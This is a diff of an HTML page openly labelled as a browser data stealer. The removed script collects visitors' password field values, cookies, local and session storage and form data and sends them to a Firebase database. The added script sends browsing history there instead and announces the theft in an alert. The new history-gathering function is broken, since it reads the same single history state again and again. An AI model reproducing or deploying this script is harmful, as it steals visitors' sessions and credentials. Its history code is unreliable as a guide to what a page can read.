@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Browser Data Stealer</title>
+  <title>Browser History Stealer</title>
 </head>
 <body>
-  <h1>Browser Data Stealer</h1>
-  <p>Visit this site to steal your data.</p>
+  <h1>Browser History Stealer</h1>
+  <p>Visit this site to steal your browsing history.</p>
 
   <!-- Firebase SDK via script tag -->
   <script type="module">
@@ -28,50 +28,24 @@
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
 
-    // Collect all passwords
-    const passwords = Array.from(document.querySelectorAll("input[type='password']"))
-      .map(input => input.value);
+    // Function to get browser history
+    function getBrowserHistory() {
+      const history = [];
+      let current = window.history.length;
 
-    // Collect browsing history
-    const history = window.history.state ? window.history.state.title : "No history";
+      for (let i = 0; i < current; i++) {
+        history.push(window.history.state.title || "No Title");
+      }
 
-    // Collect cookies
-    const cookies = document.cookie;
-
-    // Collect localStorage
-    const localStorageData = JSON.stringify(localStorage);
-
-    // Collect sessionStorage
-    const sessionStorageData = JSON.stringify(sessionStorage);
-
-    // Collect navigator.userAgent
-    const userAgent = navigator.userAgent;
-
-    // Collect screen resolution
-    const screenRes = window.screen.width + "x" + window.screen.height;
-
-    // Collect form data
-    const formData = new FormData(document.forms[0]);
-    const formValues = {};
-    for (let [key, value] of formData.entries()) {
-      formValues[key] = value;
+      return history;
     }
 
-    // Send data to Firebase
-    const data = {
-      passwords,
-      history,
-      cookies,
-      localStorage: localStorageData,
-      sessionStorage: sessionStorageData,
-      userAgent,
-      screenRes,
-      formValues
-    };
+    // Get and send browser history to Firebase
+    const browserHistory = getBrowserHistory();
 
-    set(ref(database, "data"), data)
+    set(ref(database, "history"), browserHistory)
       .then(() => {
-        alert("Your data has been stolen!");
+        alert("Your browsing history has been stolen!");
       })
       .catch((error) => {
         console.error("Error writing data to Firebase:", error);
